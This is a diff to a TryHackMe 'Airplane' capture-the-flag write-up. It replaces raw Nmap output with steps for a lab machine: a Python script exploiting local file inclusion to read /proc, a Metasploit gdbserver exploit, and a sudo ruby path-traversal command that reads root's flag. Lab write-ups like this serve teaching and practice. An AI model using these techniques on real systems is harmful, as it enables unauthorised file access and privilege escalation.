@@ -1,83 +1,71 @@
-# Nmap Results
+# Airplane (Tryhackme)
+
+**This writeup will guide you through the “Airplane” room on TryHackMe, from start to finish. We’ll cover the steps, tools, and techniques needed to complete the challenge, from initial scanning to gaining root access. Whether you’re a beginner or an experienced hacker, this guide will help you navigate and conquer the “Airplane” room. Let’s dive in and take off on this cybersecurity adventure!**
+
+*The first step is to perform an Nmap scan to identify open ports and services on the target machine.*
+![Screenshot 2024-10-08 133229](https://github.com/user-attachments/assets/43286e92-2b9d-4c50-881a-78926570a938)
+
+now first configure /etc/hosts to resolve given ip to airplane.thm
+
+![Screenshot 2024-10-08 133529](https://github.com/user-attachments/assets/f3a6a56e-fa89-41c0-8b8b-5c7c0f7a4cbb)
+
+*Upon visiting airplane.thm:8000, we discovered a Local File Inclusion (LFI) vulnerability.*
+
+![Screenshot 2024-10-08 133607](https://github.com/user-attachments/assets/f958cd7f-dd68-4648-bbdc-c09000321196)
+
+By visiting using burpsuite /proc/net/tcp, we observed several running services and noted that port 6048 → hex (17A0) also has an active unknown service
+![Screenshot 2024-10-08 133631](https://github.com/user-attachments/assets/4731dcb5-7169-4bf8-ba14-e9f6c24e02bc)
+
+I use chat-gpt to write python code to find pid of services running on port 6048.
+
 ```
-# Nmap 7.94SVN scan initiated Fri Jun 21 13:45:16 2024 as: nmap -Pn -p- --min-rate 2000 -sC -sV -oN nmap-scan.txt 10.10.192.106
-Nmap scan report for 10.10.192.106
-Host is up (0.076s latency).
-Not shown: 65532 closed tcp ports (reset)
-PORT     STATE SERVICE  VERSION
-22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
-|   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
-|_  256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)
-6048/tcp open  x11?
-8000/tcp open  http-alt Werkzeug/3.0.2 Python/3.8.10
-|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
-| fingerprint-strings:
-|   FourOhFourRequest:
-|     HTTP/1.1 404 NOT FOUND
-|     Server: Werkzeug/3.0.2 Python/3.8.10
-|     Date: Fri, 21 Jun 2024 17:46:03 GMT
-|     Content-Type: text/html; charset=utf-8
-|     Content-Length: 207
-|     Connection: close
-|     <!doctype html>
-|     <html lang=en>
-|     <title>404 Not Found</title>
-|     <h1>Not Found</h1>
-|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
-|   GetRequest:
-|     HTTP/1.1 302 FOUND
-|     Server: Werkzeug/3.0.2 Python/3.8.10
-|     Date: Fri, 21 Jun 2024 17:45:58 GMT
-|     Content-Type: text/html; charset=utf-8
-|     Content-Length: 269
-|     Location: http://airplane.thm:8000/?page=index.html
-|     Connection: close
-|     <!doctype html>
-|     <html lang=en>
-|     <title>Redirecting...</title>
-|     <h1>Redirecting...</h1>
-|     <p>You should be redirected automatically to the target URL: <a href="http://airplane.thm:8000/?page=index.html">http://airplane.thm:8000/?page=index.html</a>. If not, click the link.
-|   Socks5:
-|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
-|     "http://www.w3.org/TR/html4/strict.dtd">
-|     <html>
-|     <head>
-|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
-|     <title>Error response</title>
-|     </head>
-|     <body>
-|     <h1>Error response</h1>
-|     <p>Error code: 400</p>
-|     <p>Message: Bad request syntax ('
-|     ').</p>
-|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
-|     </body>
-|_    </html>
-|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+import requests
 
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+def read_file(base_url, path):
+    file_url = f"{base_url}/?page=../../../../{path}"
+    try:
+        response = requests.get(file_url)
+        if response.status_code == 200:
+            return response.text
+        else:
+            return None
+    except Exception as e:
+        print(f"Error reading {path}: {e}")
+        return None
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Fri Jun 21 13:48:46 2024 -- 1 IP address (1 host up) scanned in 210.18 seconds
+def find_pid_by_port(base_url, port):
+    for pid in range(1, 5000):  # Adjust the range based on the expected number of PIDs
+        cmdline_path = f"proc/{pid}/cmdline"
+        cmdline = read_file(base_url, cmdline_path)
+        if cmdline:
+            if str(port) in cmdline:
+                return pid
+    return None
+
+# Example usage
+base_url = 'http://airplane.thm:8000'
+port = '6048'
+pid = find_pid_by_port(base_url, port)
+if pid:
+    cmdline = read_file(base_url, f"proc/{pid}/cmdline")
+    status = read_file(base_url, f"proc/{pid}/status")
+    print(f'PID using port {port}: {pid}')
+    print(f'Command line: {cmdline}')
+    print(f'Status: {status}')
+else:
+    print(f'No process found using port {port}')
+```
+I discovered that gdbserver is running on port 6048 with PID 524.
+![Screenshot 2024-10-08 133856](https://github.com/user-attachments/assets/5b0db5a8-fe92-4f81-9ab3-6261f5162032)
+
+I found out that there is an exploit available for gdbserver, so I used the Metasploit exploit multi/gdb/gdb_server_exec. and fill all required options.
+
+Here is the Ruby script I wrote to read root.txt:
+```
+# read_root.rb
+puts File.read('/root/root.txt')
 ```
 
-**Don't miss the opportunity to look over the output from nmap --- specifically service banners, redirects, hostnames, and other breadcrumbs.**
-The web server running on ``tcp/8000`` has a redirect to ``airplane.thm``, so let's go ahead and get that added to our ``/etc/hosts`` file.
+I saved this script in my current directory and executed it using the following command:
 
-``
-echo -e '10.10.192.106\tairplane.thm' | sudo tee -a /etc/hosts
-``
-# Service Enumeration
-**TCP/6048**
-``
-echo -e '\r\n' | nc -v airplane.thm 6048
-``
-``
-telnet airplane.thm 6048
-``
-**Try some simple banner grabbing and service enumeration techniques on an unknown port with no output from the` nmap `scan. Nothing interesting or useful here initially.**
-
-
+sudo /usr/bin/ruby /root/../home/carlos/read_root.rb
